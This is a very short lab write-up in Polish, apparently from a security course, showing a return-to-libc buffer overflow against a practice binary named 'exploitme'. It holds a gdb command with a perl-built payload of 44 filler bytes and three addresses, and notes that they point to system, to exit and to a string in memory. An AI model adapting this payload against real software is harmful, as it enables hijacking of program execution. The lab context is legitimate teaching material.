# Lab3

```gdb --args exploitme `perl -e 'printf "1"x44 . "\x54\x84\x04\x08" . "\xd4\x84\x04\x08" . "\xd0\x87\x04\x08"'` ```
pierwszy adres wywołania `system`, drugi powrotu do wywołania `exit`, trzeci widoczny pod adresem 0804a030 przez `x/s 0x0804a030` w gdb
